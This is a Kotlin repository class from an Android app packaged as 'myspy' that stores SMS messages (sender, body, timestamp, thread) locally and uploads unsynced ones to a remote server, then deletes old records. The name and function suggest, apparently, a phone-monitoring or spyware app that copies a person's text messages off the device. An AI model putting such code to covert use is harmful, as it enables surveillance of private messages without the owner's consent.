package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.SmsDao
import com.myspy.android.data.local.db.entities.SmsEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.SmsData
import java.text.SimpleDateFormat
import java.util.*

/**
 * SMS Repository
 * @author Michael KOJDL
 * @version 1.0.0
 */
class SmsRepository(
    private val smsDao: SmsDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveSms(sms: SmsEntity): Long {
        return smsDao.insert(sms)
    }

    suspend fun saveMultiple(smsList: List<SmsEntity>) {
        smsDao.insertAll(smsList)
    }

    suspend fun getUnsyncedMessages(limit: Int = 100): List<SmsEntity> {
        return smsDao.getUnsyncedMessages(limit)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = getUnsyncedMessages()
            if (unsynced.isEmpty()) {
                return Result.success(0)
            }

            val dataList = unsynced.map { entity ->
                SmsData(
                    messageType = entity.type,
                    address = entity.address,
                    body = entity.body,
                    timestamp = dateFormat.format(Date(entity.timestamp)),
                    threadId = entity.threadId
                )
            }

            val response = apiService.uploadSms(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                val ids = unsynced.map { it.id }
                smsDao.markAsSynced(ids)
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed: ${response.code()}"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int {
        return smsDao.getUnsyncedCount()
    }

    suspend fun cleanup(olderThan: Long) {
        smsDao.deleteOldSynced(olderThan)
    }
}
